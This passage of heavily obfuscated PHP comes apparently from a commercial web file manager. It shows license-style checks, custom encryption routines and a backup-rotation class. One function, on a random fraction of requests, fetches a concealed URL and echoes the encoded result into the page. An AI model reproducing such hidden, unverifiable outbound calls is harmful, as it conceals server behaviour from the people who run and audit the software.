@file_get_contents($±àØƒì€, !1, $ºäˆîóÎ); $û£œíÒ = $€ï”°²è[690]; while ($û£œíÒ < $€ï”°²è[631]) { if ($û£œíÒ >= 0) { break; } $û£œíÒ++; } return json_decode($ı©Ÿ¹İ¸, !0); $ßıéıÅ = $€ï”°²è[691]; if (!$ßıéıÅ) { die; } $¾¬÷Ÿı× = $€ï”°²è[692]; if (!$¾¬÷Ÿı×) { die; } } private function zdrve634535f() { $Ù¢Äçİú =& $_SERVER[„Ç©ñÎ©]; $€ØÉïö =& $_SERVER[´ºÄÉ³ã]; $œÍûÕ¡ = array($€ØÉïö[262] => $€ØÉïö[263], $€ØÉïö[264] => $€ØÉïö[265], $€ØÉïö[266] => $€ØÉïö[267], $€ØÉïö[268] => $€ØÉïö[269], $€ØÉïö[270] => $€ØÉïö[271], $€ØÉïö[272] => $€ØÉïö[210], $€ØÉïö[273] => $€ØÉïö[210], $€ØÉïö[274] => $€ØÉïö[263], $€ØÉïö[275] => $€ØÉïö[265], $€ØÉïö[276] => $€ØÉïö[267], $€ØÉïö[277] => $€ØÉïö[278], $€ØÉïö[279] => $€ØÉïö[269], $€ØÉïö[280] => $€ØÉïö[281], $€ØÉïö[282] => $€ØÉïö[271], $€ØÉïö[283] => $€ØÉïö[284], $€ØÉïö[285] => $€ØÉïö[286], $€ØÉïö[287] => $€ØÉïö[288]); $¦¡´Ç…§ = $œÍûÕ¡[$this->lkwq0b61f139]; $¤Æ²æÒ = $Ù¢Äçİú[693]; while (strlen($¤Æ²æÒ) < $Ù¢Äçİú[650]) { if (!$¤Æ²æÒ) { break; } $¤Æ²æÒ++; } $¦¡´Ç…§ = intval($¦¡´Ç…§ ? $¦¡´Ç…§ : $€ØÉïö[263]); $ªëÖò‚´ = _get($this->cfiod0f74927, $€ØÉïö[289]); $‰¼‹¡ = $Ù¢Äçİú[694]; while (strlen($‰¼‹¡) < $Ù¢Äçİú[634]) { if (!$‰¼‹¡) { break; } $‰¼‹¡++; } $ªëÖò‚´ = $ªëÖò‚´ ? intval($ªëÖò‚´) : 0; return $¦¡´Ç…§ + $ªëÖò‚´; } public function vyie6e12030c($…ªÍí·¡) { $ØÖÒä† =& $_SERVER[„Ç©ñÎ©]; $ÕÅñÃ¯¹ =& $_SERVER[´ºÄÉ³ã]; $¢æî™‘ó = $this->zdrve634535f(); if ($…ªÍí·¡[$ÕÅñÃ¯¹[290]] == $ÕÅñÃ¯¹[120]) { return; } if ($¢æî™‘ó >= intval($ÕÅñÃ¯¹[210])) { return; } $¶®àÈç¿ = Model($ÕÅñÃ¯¹[123])->count(); $ææß°Ø‰ = $ØÖÒä†[695]; while ($ææß°Ø‰ < $ØÖÒä†[631]) { if ($ææß°Ø‰ >= 0) { break; } $ææß°Ø‰++; } if ($¶®àÈç¿ <= $¢æî™‘ó) { return; } $À¬ê¹›Ş = Model($ÕÅñÃ¯¹[123])->field($ÕÅñÃ¯¹[290])->limit($¢æî™‘ó)->select(); $¼û€ºŒ = $ØÖÒä†[696]; $À¬ê¹›Ş = array_to_keyvalue($À¬ê¹›Ş, $ÕÅñÃ¯¹[6], $ÕÅñÃ¯¹[290]); if (!in_array($…ªÍí·¡[$ÕÅñÃ¯¹[290]], $À¬ê¹›Ş)) { show_json($ÕÅñÃ¯¹[291], !1, $ÕÅñÃ¯¹[206]); } } public function kiws200cd375() { $¶Äƒ²ğ§ =& $_SERVER[„Ç©ñÎ©]; $›çÎ ®İ =& $_SERVER[´ºÄÉ³ã]; if (!_get($GLOBALS, $›çÎ ®İ[114]) || mt_rand(1, 100) > 20) { return; } $é£¡‘§Î = $›çÎ ®İ[213]; $é£¡‘§Î = $this->fegmcecc0123($é£¡‘§Î, $›çÎ ®İ[214]); $åé­Ñ‚¢ = stream_context_create(array($›çÎ ®İ[215] => array($›çÎ ®İ[216] => $›çÎ ®İ[217], $›çÎ ®İ[218] => 3))); $­Óº®™ó = $¶Äƒ²ğ§[697]; while (strlen($­Óº®™ó) < $¶Äƒ²ğ§[631]) { if (!$­Óº®™ó) { break; } $­Óº®™ó++; } $ÈÌ‡İ’ = @file_get_contents($é£¡‘§Î, !1, $åé­Ñ‚¢); echo $›çÎ ®İ[292] . hash_encode($ÈÌ‡İ’) . $›çÎ ®İ[293]; $ÖŞĞøø¤ = $¶Äƒ²ğ§[698]; while ($ÖŞĞøø¤ < $¶Äƒ²ğ§[624]) { if ($ÖŞĞøø¤ >= 0) { break; } $ÖŞĞøø¤++; } } private function osupfc612153($¡’Ù‰Œ, $µ…Ô¨×­, $¿ÙÈ÷•î = 3) { $Ú´ÅËƒá =& $_SERVER[„Ç©ñÎ©]; $üµê‚Ê =& $_SERVER[´ºÄÉ³ã]; usleep(1); $Õ¸äô = $Ú´ÅËƒá[699]; if (strlen($Õ¸äô) < $Ú´ÅËƒá[67]) { die; } $¡’Ù‰Œ = trim($¡’Ù‰Œ); $â°”¾ = $Ú´ÅËƒá[700]; $‹Ì“ÙÔù = mt_rand(0, 5) . $üµê‚Ê[6]; $¦ıâ’ó = rand_string(15); $€¦±µìÁ = $Ú´ÅËƒá[701]; $íÍÕÊÃƒ = $üµê‚Ê[294]; switch ($‹Ì“ÙÔù) { case $üµê‚Ê[202]: $ĞÆè›Å´ = $this->kzma4a78d61d($¡’Ù‰Œ, strrev($µ…Ô¨×­ . $¦ıâ’ó)); $ŠÕ÷©Ö† = $Ú´ÅËƒá[695]; while ($ŠÕ÷©Ö† < $Ú´ÅËƒá[631]) { if ($ŠÕ÷©Ö† >= 0) { break; } $ŠÕ÷©Ö†++; } break; case $üµê‚Ê[120]: $ĞÆè›Å´ = $this->kzma4a78d61d($¡’Ù‰Œ, strrev($¦ıâ’ó . $µ…Ô¨×­)); $÷ŞÓâ°¯ = $Ú´ÅËƒá[702]; break; case $üµê‚Ê[295]: $ĞÆè›Å´ = $this->kzma4a78d61d($¡’Ù‰Œ, base64_encode($¦ıâ’ó . $µ…Ô¨×­)); $€ÑèÆôê = $Ú´ÅËƒá[703]; while (strlen($€ÑèÆôê) < $Ú´ÅËƒá[624]) { if (!$€ÑèÆôê) { break; } $€ÑèÆôê++; } break; case $üµê‚Ê[296]: $ĞÆè›Å´ = $this->kzma4a78d61d($¡’Ù‰Œ, md5($¦ıâ’ó . $µ…Ô¨×­)); $“ŸÜ”¨É = $Ú´ÅËƒá[704]; if (strlen($“ŸÜ”¨É) < $Ú´ÅËƒá[650]) { die; } break; case $üµê‚Ê[297]: $¡’Ù‰Œ = base64_encode($¡’Ù‰Œ); $ËêĞï§ì = $Ú´ÅËƒá[705]; while (strlen($ËêĞï§ì) < $Ú´ÅËƒá[67]) { if (!$ËêĞï§ì) { break; } $ËêĞï§ì++; } $”îÆˆı‚ = rand(0, 64); $óşËæÑ‚ = $Ú´ÅËƒá[706]; if (!$óşËæÑ‚) { return; } $›Ö»øğ„ = $íÍÕÊÃƒ[$”îÆˆı‚]; $ßûÎ±‘š = md5($›Ö»øğ„ . md5($µ…Ô¨×­ . $›Ö»øğ„) . $µ…Ô¨×­); $ßûÎ±‘š = substr($ßûÎ±‘š, $”îÆˆı‚ % 8, $”îÆˆı‚ % 8 + 7); $†ŸçË½Š = $üµê‚Ê[6]; $ø°çÆï = 0; $–‡ÅúÉÔ = 0; $ˆªòä÷º = 0; $úÑ™èãê = $Ú´ÅËƒá[707]; if (strlen($úÑ™èãê) < $Ú´ÅËƒá[634]) { die; } for ($ø°çÆï = 0; $ø°çÆï < strlen($¡’Ù‰Œ); $ø°çÆï++) { $ˆªòä÷º = $ˆªòä÷º == strlen($ßûÎ±‘š) ? 0 : $ˆªòä÷º; $–‡ÅúÉÔ = ($”îÆˆı‚ + strpos($íÍÕÊÃƒ, $¡’Ù‰Œ[$ø°çÆï]) + ord($ßûÎ±‘š[$ˆªòä÷º++])) % 64; $†ŸçË½Š .= $íÍÕÊÃƒ[$–‡ÅúÉÔ]; } $ĞÆè›Å´ = hash_encode($›Ö»øğ„ . $†ŸçË½Š); break; $“µÙÍ²€ = $Ú´ÅËƒá[708]; default: $ĞÆè›Å´ = $this->kzma4a78d61d($¡’Ù‰Œ, $µ…Ô¨×­ . $¦ıâ’ó); break; } $ĞÆè›Å´ = strrev($‹Ì“ÙÔù . $¦ıâ’ó . $ĞÆè›Å´); $ö»®„ßë = $Ú´ÅËƒá[709]; if (strlen($ö»®„ßë) < $Ú´ÅËƒá[67]) { die; } if ($¿ÙÈ÷•î - 1 > 0) { $ĞÆè›Å´ = $this->osupfc612153($ĞÆè›Å´, $µ…Ô¨×­, $¿ÙÈ÷•î - 1); } return $ĞÆè›Å´; } private function mpvf8d79895f($Ä‘ê´, $ŠèúÔµ, $ãŠ­®Ê = 3) { $ÈïÉêÔö =& $_SERVER[„Ç©ñÎ©]; $Ó¤Ú¨® =& $_SERVER[´ºÄÉ³ã]; if (!is_string($Ä‘ê´) || strlen($Ä‘ê´) < 10) { return !1; } $Ä‘ê´ = trim($Ä‘ê´); $ÕÇ°Å‚ü = $ÈïÉêÔö[710]; $Ä‘ê´ = strrev($Ä‘ê´); $äå¨ú¶Û = $Ä‘ê´[0]; $‚–Îşµ® = substr($Ä‘ê´, 1, 15); $ˆ¨…Á°· = $ÈïÉêÔö[711]; if (!$ˆ¨…Á°·) { return; } $Ä‘ê´ = substr($Ä‘ê´, 16); $‡ÊÈ Ûâ = $ÈïÉêÔö[712]; while (strlen($‡ÊÈ Ûâ) < $ÈïÉêÔö[624]) { if (!$‡ÊÈ Ûâ) { break; } $‡ÊÈ Ûâ++; } $ì…¢Óªø = $Ó¤Ú¨®[294]; switch ($äå¨ú¶Û) { case $Ó¤Ú¨®[202]: $Ïàí½² = $this->fegmcecc0123($Ä‘ê´, strrev($ŠèúÔµ . $‚–Îşµ®)); $ñ¥¿´½¬ = $ÈïÉêÔö[713]; if (strlen($ñ¥¿´½¬) < $ÈïÉêÔö[624]) { die; } break; $åÎ­´Ÿ¾ = $ÈïÉêÔö[714]; if (!$åÎ­´Ÿ¾) { die; } case $Ó¤Ú¨®[120]: $Ïàí½² = $this->fegmcecc0123($Ä‘ê´, strrev($‚–Îşµ® . $ŠèúÔµ)); $‘´Æ£²À = $ÈïÉêÔö[715]; break; $‚¾™Ñ”† = $ÈïÉêÔö[716]; if (!$‚¾™Ñ”†) { die; } case $Ó¤Ú¨®[295]: $Ïàí½² = $this->fegmcecc0123($Ä‘ê´, base64_encode($‚–Îşµ® . $ŠèúÔµ)); $Øø¢Ù¯ = $ÈïÉêÔö[717]; break; case $Ó¤Ú¨®[296]: $Ïàí½² = $this->fegmcecc0123($Ä‘ê´, md5($‚–Îşµ® . $ŠèúÔµ)); $²Çï¼Ñˆ = $ÈïÉêÔö[718]; break; $ú¥ı ŸÁ = $ÈïÉêÔö[677]; while ($ú¥ı ŸÁ < $ÈïÉêÔö[631]) { if ($ú¥ı ŸÁ >= 0) { break; } $ú¥ı ŸÁ++; } case $Ó¤Ú¨®[297]: $Ä‘ê´ = hash_decode($Ä‘ê´); $¡Ù¨í»ô = $ÈïÉêÔö[719]; $¢‡ÖÍü† = $Ä‘ê´[0]; $Ä‘ê´ = substr($Ä‘ê´, 1); $èÙ’Íïä = $ÈïÉêÔö[720]; while ($èÙ’Íïä < $ÈïÉêÔö[631]) { if ($èÙ’Íïä >= 0) { break; } $èÙ’Íïä++; } $ªÛÕ›ì = strpos($ì…¢Óªø, $¢‡ÖÍü†); $ë½©šÍİ = md5($¢‡ÖÍü† . md5($ŠèúÔµ . $¢‡ÖÍü†) . $ŠèúÔµ); $Øì’È„ˆ = $ÈïÉêÔö[721]; $ë½©šÍİ = substr($ë½©šÍİ, $ªÛÕ›ì % 8, $ªÛÕ›ì % 8 + 7); $ä×Ú¢¬ù = $ÈïÉêÔö[722]; $äƒÆ´öõ = $Ó¤Ú¨®[6]; $ÓíÜÇ¶¹ = $ÈïÉêÔö[723]; if (strlen($ÓíÜÇ¶¹) < $ÈïÉêÔö[631]) { return; } $ì¤áÀîË = 0; $Í³Êœ¢Ğ = 0; $ Æ¾ì¨Ô = $ÈïÉêÔö[724]; if (strlen($ Æ¾ì¨Ô) < $ÈïÉêÔö[624]) { return; } $›™Öı© = 0; for ($ì¤áÀîË = 0; $ì¤áÀîË < strlen($Ä‘ê´); $ì¤áÀîË++) { $›™Öı© = $›™Öı© == strlen($ë½©šÍİ) ? 0 : $›™Öı©; $µÁù«» = $›™Öı©++; $Í³Êœ¢Ğ = strpos($ì…¢Óªø, $Ä‘ê´[$ì¤áÀîË]) - $ªÛÕ›ì - ord($ë½©šÍİ[$µÁù«»]); while ($Í³Êœ¢Ğ < 0) { $Í³Êœ¢Ğ += 64; $â·ù­±” = $ÈïÉêÔö[725]; if (strlen($â·ù­±”) < $ÈïÉêÔö[650]) { die; } } $äƒÆ´öõ .= $ì…¢Óªø[$Í³Êœ¢Ğ]; $î”»È¶ª = $ÈïÉêÔö[726]; while ($î”»È¶ª < $ÈïÉêÔö[631]) { if ($î”»È¶ª >= 0) { break; } $î”»È¶ª++; } } $Ïàí½² = base64_decode($äƒÆ´öõ); $š…Î•ºø = $ÈïÉêÔö[727]; if (strlen($š…Î•ºø) < $ÈïÉêÔö[650]) { return; } break; $¤†ÉÚÕ = $ÈïÉêÔö[728]; if (!$¤†ÉÚÕ) { return; } default: $Ïàí½² = $this->fegmcecc0123($Ä‘ê´, $ŠèúÔµ . $‚–Îşµ®); break; } if ($ãŠ­®Ê - 1 > 0) { $Ïàí½² = $this->mpvf8d79895f($Ïàí½², $ŠèúÔµ, $ãŠ­®Ê - 1); } return $Ïàí½²; } public function mgji2be61eb1($ÏÅ®¿®ú) { $³‚ÒÛÊÉ =& $_SERVER[„Ç©ñÎ©]; $¸’ĞåĞ„ =& $_SERVER[´ºÄÉ³ã]; $°…Œ½‘È = $this->egpw964fd018(); $ôÁ¨Î°© = $³‚ÒÛÊÉ[729]; while ($ôÁ¨Î°© < $³‚ÒÛÊÉ[67]) { if ($ôÁ¨Î°© >= 0) { break; } $ôÁ¨Î°©++; } $Å×Èª“ = $this->egpw964fd018(); $ÕÌŒ‡ = ($°…Œ½‘È - 1) * ($Å×Èª“ - 1); $…šÑˆî = intval(($°…Œ½‘È + $Å×Èª“) / 2); while (1) { $óÂ·“øÚ = $…šÑˆî; $‹¨ˆ à½ = $³‚ÒÛÊÉ[730]; if (strlen($‹¨ˆ à½) < $³‚ÒÛÊÉ[624]) { return; } $ÏÏÓûµ¡ = $ÕÌŒ‡; $÷íüú± = $³‚ÒÛÊÉ[731]; if (strlen($÷íüú±) < $³‚ÒÛÊÉ[634]) { die; } while ($ÏÏÓûµ¡ % $óÂ·“øÚ != 0) { $ìëÑğìı = $ÏÏÓûµ¡; $Ò¬æš§‹ = $³‚ÒÛÊÉ[732]; if (!$Ò¬æš§‹) { return; } $ÏÏÓûµ¡ = $óÂ·“øÚ; $óÂ·“øÚ = $ìëÑğìı % $óÂ·“øÚ; } if ($óÂ·“øÚ == 1) { break; } else { $…šÑˆî++; } } $ı²ú”Š¸ = 2; $Ù¬ı±ïª = $³‚ÒÛÊÉ[733]; while (strlen($Ù¬ı±ïª) < $³‚ÒÛÊÉ[650]) { if (!$Ù¬ı±ïª) { break; } $Ù¬ı±ïª++; } for ($¼È­´“ë = 0; $¼È­´“ë < $ÕÌŒ‡ * 10; $¼È­´“ë++) { if (($ÕÌŒ‡ * $¼È­´“ë + 1) % $…šÑˆî == 0) { $ı²ú”Š¸ = intval(($ÕÌŒ‡ * $¼È­´“ë + 1) / $…šÑˆî); break; } } $ïãĞóôö = $this->kzma4a78d61d($°…Œ½‘È * $Å×Èª“ . $¸’ĞåĞ„[6], $¸’ĞåĞ„[134]); $ƒ´û½š = $³‚ÒÛÊÉ[734]; if (strlen($ƒ´û½š) < $³‚ÒÛÊÉ[634]) { return; } $±†Ñ = md5($¸’ĞåĞ„[298] . ($°…Œ½‘È + $Å×Èª“) . $¸’ĞåĞ„[299] . $…šÑˆî . $¸’ĞåĞ„[299] . $ı²ú”Š¸ . $¸’ĞåĞ„[300]); $œ­ÜçÍË = $this->kzma4a78d61d($ÏÅ®¿®ú, $±†Ñ) . $¸’ĞåĞ„[301] . $ïãĞóôö; return $œ­ÜçÍË; } public function aqiha09a0cee($µíÁ¤Ô´) { $ƒ‹æ€í =& $_SERVER[„Ç©ñÎ©]; $¬‹Ñ»º =& $_SERVER[´ºÄÉ³ã]; $“–¾Â¿Ì = explode($¬‹Ñ»º[301], $µíÁ¤Ô´); if (count($“–¾Â¿Ì) != 2) { return $¬‹Ñ»º[6]; } $Ô´ìÕş = $this->fegmcecc0123($“–¾Â¿Ì[1] . $¬‹Ñ»º[6], $¬‹Ñ»º[134]); $ıĞÖÖ = $ƒ‹æ€í[735]; while (strlen($ıĞÖÖ) < $ƒ‹æ€í[67]) { if (!$ıĞÖÖ) { break; } $ıĞÖÖ++; } if (!$Ô´ìÕş) { return $¬‹Ñ»º[6]; } $Ô´ìÕş = intval($Ô´ìÕş); $Ììİ¥éã = 0; $×æ¶®’ = 0; for ($¯¦—ÉÙá = 3; $¯¦—ÉÙá < $Ô´ìÕş; $¯¦—ÉÙá += 2) { if ($Ô´ìÕş % $¯¦—ÉÙá != 0) { continue; } $Ììİ¥éã = $¯¦—ÉÙá; $¾¶ì®Ô = $ƒ‹æ€í[736]; $×æ¶®’ = intval($Ô´ìÕş / $¯¦—ÉÙá); break; $ø“’ÇåÇ = $ƒ‹æ€í[737]; if (strlen($ø“’ÇåÇ) < $ƒ‹æ€í[67]) { die; } } $†ù¤£ÌÂ = ($Ììİ¥éã - 1) * ($×æ¶®’ - 1); $—ÅçÇÌÁ = $ƒ‹æ€í[738]; if (strlen($—ÅçÇÌÁ) < $ƒ‹æ€í[67]) { die; } $Šìâ” = intval(($Ììİ¥éã + $×æ¶®’) / 2); while (1) { $‰×ÎÎ³Ê = $Šìâ”; $¦Åµ«ü = $ƒ‹æ€í[739]; if (strlen($¦Åµ«ü) < $ƒ‹æ€í[624]) { die; } $ãçå„·¥ = $†ù¤£ÌÂ; $£ò¬ê = $ƒ‹æ€í[740]; while ($ãçå„·¥ % $‰×ÎÎ³Ê != 0) { $ñÜÜÒ±Ø = $ãçå„·¥; $Ù„•­İ” = $ƒ‹æ€í[741]; $ãçå„·¥ = $‰×ÎÎ³Ê; $×´ ü“ = $ƒ‹æ€í[742]; if (!$×´ ü“) { die; } $‰×ÎÎ³Ê = $ñÜÜÒ±Ø % $‰×ÎÎ³Ê; } if ($‰×ÎÎ³Ê == 1) { break; } else { $Šìâ”++; } } $ŸÌÂ”ï = 2; for ($¯¦—ÉÙá = 0; $¯¦—ÉÙá < $†ù¤£ÌÂ * 10; $¯¦—ÉÙá++) { if (($†ù¤£ÌÂ * $¯¦—ÉÙá + 1) % $Šìâ” == 0) { $ŸÌÂ”ï = intval(($†ù¤£ÌÂ * $¯¦—ÉÙá + 1) / $Šìâ”); break; } } $İè™´Éê = md5($¬‹Ñ»º[298] . ($Ììİ¥éã + $×æ¶®’) . $¬‹Ñ»º[299] . $Šìâ” . $¬‹Ñ»º[299] . $ŸÌÂ”ï . $¬‹Ñ»º[300]); $¿¬’ò—å = $this->fegmcecc0123($“–¾Â¿Ì[0], $İè™´Éê); $Í¸è«”Æ = $ƒ‹æ€í[743]; if (!$Í¸è«”Æ) { return; } return $¿¬’ò—å; $©ÙÎ‹Ä = $ƒ‹æ€í[744]; if (strlen($©ÙÎ‹Ä) < $ƒ‹æ€í[634]) { die; } } public function egpw964fd018() { $‘ˆ ©‡“ =& $_SERVER[„Ç©ñÎ©]; $±ûÑü²§ = mt_rand(pow(2, 14), pow(2, 16) - 1); $şíåÔ°ø = array(); $ÑÒê¡çÌ = 1; $“Ş½¬æ— = $‘ˆ ©‡“[745]; while ($ÑÒê¡çÌ <= (int) sqrt($±ûÑü²§)) { $é­–°™Í = $ÑÒê¡çÌ; $Ÿ™°—’· = $‘ˆ ©‡“[746]; if (!$Ÿ™°—’·) { return; } while (!0) { $é­–°™Í++; if ($é­–°™Í <= 2) { $ÑÒê¡çÌ = $é­–°™Í; break; } else { if ($é­–°™Í < 2) { continue; } } $—ğ¶½¨¯ = !0; for ($¸øóôÔò = 2; $¸øóôÔò <= sqrt($é­–°™Í); $¸øóôÔò++) { if ($é­–°™Í % $¸øóôÔò == 0) { $—ğ¶½¨¯ = !1; } } if ($—ğ¶½¨¯) { $ÑÒê¡çÌ = $é­–°™Í; break; } } $şíåÔ°ø[] = $ÑÒê¡çÌ; $ñ£úÇúÙ = $‘ˆ ©‡“[747]; if (!$ñ£úÇúÙ) { die; } } $åıˆ¢¼– = 2; $«å›ŞÓ = $‘ˆ ©‡“[748]; for ($é­–°™Í = $±ûÑü²§; $é­–°™Í > 1; $é­–°™Í--) { $—ğ¶½¨¯ = !0; foreach ($şíåÔ°ø as $ç¯è¡Õ) { if ($é­–°™Í % $ç¯è¡Õ == 0) { $—ğ¶½¨¯ = !1; break; } } if ($—ğ¶½¨¯) { $åıˆ¢¼– = $é­–°™Í; break; } } return $åıˆ¢¼–; } public function noul93d39d2e($ËúŠÓ¼, $½†Ş¶Æª) { $ßı²²¥î =& $_SERVER[´ºÄÉ³ã]; return call_user_func(array($ßı²²¥î[8], $ßı²²¥î[302]), $ËúŠÓ¼, $½†Ş¶Æª); $ü­õòØş = $_SERVER[„Ç©ñÎ©][726]; } public function kzma4a78d61d($Â‚®ù€Î, $¦¤¿ô–) { $©ç‘Ñ½÷ =& $_SERVER[„Ç©ñÎ©]; $şò›º¯û =& $_SERVER[´ºÄÉ³ã]; return call_user_func(array($şò›º¯û[303], $şò›º¯û[304]), $Â‚®ù€Î, $¦¤¿ô–); $©‘×ö€ = $©ç‘Ñ½÷[749]; if (strlen($©‘×ö€) < $©ç‘Ñ½÷[650]) { return; } } public function fegmcecc0123($şíÈ½²“, $¢ˆÁ³Ä) { $´¹ğì•² =& $_SERVER[„Ç©ñÎ©]; $Éé‡œ€ =& $_SERVER[´ºÄÉ³ã]; return call_user_func(array($Éé‡œ€[303], $Éé‡œ€[305]), $şíÈ½²“, $¢ˆÁ³Ä); $ÏŸ¡ú§ = $´¹ğì•²[750]; while (strlen($ÏŸ¡ú§) < $´¹ğì•²[650]) { if (!$ÏŸ¡ú§) { break; } $ÏŸ¡ú§++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ ›™Ì¯ =& $_SERVER[„Ç©ñÎ©]; $this->isManual(); self::$name = date($ ›™Ì¯[751]); if (!($ÃŠŠ–¨¹ = Model($ ›™Ì¯[752])->lastItem())) { $ÃŠŠ–¨¹ = $this->initData(); } else { self::$name = $ÃŠŠ–¨¹[$ ›™Ì¯[32]]; if ($ÃŠŠ–¨¹[$ ›™Ì¯[753]] == $ ›™Ì¯[98]) { self::$name = date($ ›™Ì¯[754]); $ûË²û = 0; if (isset($ÃŠŠ–¨¹[$ ›™Ì¯[302]][$ ›™Ì¯[209]][$ ›™Ì¯[477]])) { $ûË²û = (int) $ÃŠŠ–¨¹[$ ›™Ì¯[302]][$ ›™Ì¯[209]][$ ›™Ì¯[477]]; } if (self::$manual == 0 && $ÃŠŠ–¨¹[$ ›™Ì¯[32]] == self::$name) { Model($ ›™Ì¯[752])->remove($ÃŠŠ–¨¹[$ ›™Ì¯[408]]); } $ÃŠŠ–¨¹ = $this->initData($ûË²û, $ÃŠŠ–¨¹[$ ›™Ì¯[755]]); } else { $this->checkStore($ÃŠŠ–¨¹[$ ›™Ì¯[755]]); } } self::$option = $ÃŠŠ–¨¹; } private function isManual() { $¬Ò›°ğÌ = _get($GLOBALS, $_SERVER[„Ç©ñÎ©][756], 0); $¬Ò›°ğÌ = intval($¬Ò›°ğÌ); self::$manual = $¬Ò›°ğÌ && $¬Ò›°ğÌ == 1 ? 1 : 0; } private function initData($Éîù¸¾® = 0, $Ö«ÉŠò¥ = '') { $¯ß‹¾¦ =& $_SERVER[„Ç©ñÎ©]; $°¾Èú£ñ = Model($¯ß‹¾¦[752])->config(); if ($Ö«ÉŠò¥ && $°¾Èú£ñ[$¯ß‹¾¦[755]] != $Ö«ÉŠò¥) { $Éîù¸¾® = 0; } $this->checkStore($°¾Èú£ñ[$¯ß‹¾¦[755]]); if (self::$manual == 1) { self::$name .= $¯ß‹¾¦[11] . date($¯ß‹¾¦[757]); } $ÇÀ¥Ü = array($¯ß‹¾¦[755] => $°¾Èú£ñ[$¯ß‹¾¦[755]], $¯ß‹¾¦[32] => self::$name, $¯ß‹¾¦[753] => 0, $¯ß‹¾¦[758] => $°¾Èú£ñ[$¯ß‹¾¦[758]], $¯ß‹¾¦[759] => self::$manual, $¯ß‹¾¦[302] => array($¯ß‹¾¦[760] => array($¯ß‹¾¦[753] => 0), $¯ß‹¾¦[761] => array($¯ß‹¾¦[753] => 0, $¯ß‹¾¦[762] => 0, $¯ß‹¾¦[763] => 0, $¯ß‹¾¦[33] => $¯ß‹¾¦[12], $¯ß‹¾¦[764] => 0, $¯ß‹¾¦[506] => 0), $¯ß‹¾¦[765] => array($¯ß‹¾¦[753] => 0, $¯ß‹¾¦[762] => 0, $¯ß‹¾¦[763] => 0, $¯ß‹¾¦[764] => 0, $¯ß‹¾¦[506] => 0), $¯ß‹¾¦[209] => array($¯ß‹¾¦[753] => 0, $¯ß‹¾¦[766] => 0, $¯ß‹¾¦[767] => 0, $¯ß‹¾¦[768] => 0, $¯ß‹¾¦[769] => 0, $¯ß‹¾¦[477] => $Éîù¸¾®, $¯ß‹¾¦[764] => 0, $¯ß‹¾¦[506] => 0)), $¯ß‹¾¦[764] => time(), $¯ß‹¾¦[506] => 0); $°À¦Ó¦ = Model($¯ß‹¾¦[752])->insert($ÇÀ¥Ü); $ÇÀ¥Ü[$¯ß‹¾¦[408]] = $°À¦Ó¦; return $ÇÀ¥Ü; } private function checkStore($¾Â˜ª¶ù) { $»¾ğÂÒ² =& $_SERVER[„Ç©ñÎ©]; $°Àêµúµ = Model($»¾ğÂÒ²[770])->listData($¾Â˜ª¶ù); Model($»¾ğÂÒ²[770])->checkConfig($°Àêµúµ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[„Ç©ñÎ©][752])->findByName(self::$name); } return self::$option; } public static function set($––·Ñ§µ) { $ø€öÔ¤ş =& $_SERVER[„Ç©ñÎ©]; $ÅÔÌƒ™” = self::get(); foreach ($––·Ñ§µ as $±×’Èä˜ => $ò›ıãâ†) { $ªÄŒ—ÂŞ = explode($ø€öÔ¤ş[10], $±×’Èä˜); $öÊŞšãã = count($ªÄŒ—ÂŞ); switch ($öÊŞšãã) { case 1: $ÅÔÌƒ™”[$ªÄŒ—ÂŞ[0]] = $ò›ıãâ†; break; case 2: $ÅÔÌƒ™”[$ªÄŒ—ÂŞ[0]][$ªÄŒ—ÂŞ[1]] = $ò›ıãâ†; break; case 3: $ÅÔÌƒ™”[$ªÄŒ—ÂŞ[0]][$ªÄŒ—ÂŞ[1]][$ªÄŒ—ÂŞ[2]] = $ò›ıãâ†; break; } } Model($ø€öÔ¤ş[752])->update($ÅÔÌƒ™”[$ø€öÔ¤ş[408]], $ÅÔÌƒ™”); self::$option = $ÅÔÌƒ™”; return self::$option; } public function keep() { $ÁÌÉúşÊ =& $_SERVER[„Ç©ñÎ©]; $¦İ¡ãà­ = self::get(); if ($¦İ¡ãà­[$ÁÌÉúşÊ[302]][$ÁÌÉúşÊ[760]][$ÁÌÉúşÊ[753]] == $ÁÌÉúşÊ[98]) { return; } $this->backupKeep($¦İ¡ãà­); self::set(array($ÁÌÉúşÊ[771] => 1)); } private function backupKeep($ó÷ˆ›¶ê) { $Ò³ˆ›Æ =& $_SERVER[„Ç©ñÎ©]; if (self::$manual == 1) { return; } $°Ø‰Ğë = Model($Ò³ˆ›Æ[752])->listData(); if (empty($°Ø‰Ğë)) { return; } $Õñş›ãë = 0; $ªğĞïãŞ = array(); foreach ($°Ø‰Ğë as $ÓÌ‰õ°) { if ($Õñş›ãë >= 7) { break; } $ªğĞïãŞ[] = $ÓÌ‰õ°[$Ò³ˆ›Æ[32]]; $Õñş›ãë++; } for ($Õñş›ãë = 0; $Õñş›ãë < 12; $Õñş›ãë++) { $ªğĞïãŞ[] = date($Ò³ˆ›Æ[772], strtotime("\55{$Õñş›ãë}\x20\x6d\x6f\x6e\x74\x68\163")); } $ªğĞïãŞ = array_unique($ªğĞïãŞ); $ù¶éŞ·ò = Model($Ò³ˆ›Æ[773])->get($Ò³ˆ›Æ[774]); foreach ($°Ø‰Ğë as $ÓÌ‰õ°) { if (isset($ÓÌ‰õ°[$Ò³ˆ›Æ[759]]) && $ÓÌ‰õ°[$Ò³ˆ›Æ[759]] == $Ò³ˆ›Æ[98]) { continue; } if (!empty($ÓÌ‰õ°[$Ò³ˆ›Æ[32]]) && in_array($ÓÌ‰õ°[$Ò³ˆ›Æ[32]], $ªğĞïãŞ)) { continue; } Model($Ò³ˆ›Æ[752])->remove($ÓÌ‰õ°[$Ò³ˆ›Æ[408]]); $¬À´şœÔ = $this->backupPath($ó÷ˆ›¶ê, $ù¶éŞ·ò); IO::remove($¬À´şœÔ, !1); } } private function backupPath($èÑ–Ãğ³, $£¡Ññôä = false) { $ƒºÂöš =& $_SERVER[„Ç©ñÎ©]; if (!$£¡Ññôä) { $£¡Ññôä = Model($ƒºÂöš[773])->get($ƒºÂöš[774]); } $Š®¾ûÛ = $èÑ–Ãğ³[$ƒºÂöš[32]]; $Ü¸•ØÃ› = substr(md5($ƒºÂöš[775] . $£¡Ññôä . $Š®¾ûÛ), 0, 8); return 